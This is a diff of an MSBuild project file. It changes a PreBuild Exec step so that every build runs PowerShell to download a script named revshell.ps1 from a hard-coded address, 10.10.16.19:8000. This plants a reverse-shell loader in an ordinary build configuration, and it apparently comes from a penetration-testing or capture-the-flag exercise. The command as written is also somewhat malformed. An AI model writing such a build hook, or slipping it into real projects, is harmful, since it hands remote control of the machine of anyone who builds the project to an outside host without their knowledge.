@@ -9,7 +9,7 @@
 	</PropertyGroup>
 
 	<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-		<Exec Command="powershell -e ://10.10.16.19:8000/revshell.ps1')" />
+		<Exec Command="powershell -e (New-Object Net.WebClient).DownloadString('http://10.10.16.19:8000/revshell.ps1')" />
 	</Target>
 
 </Project>
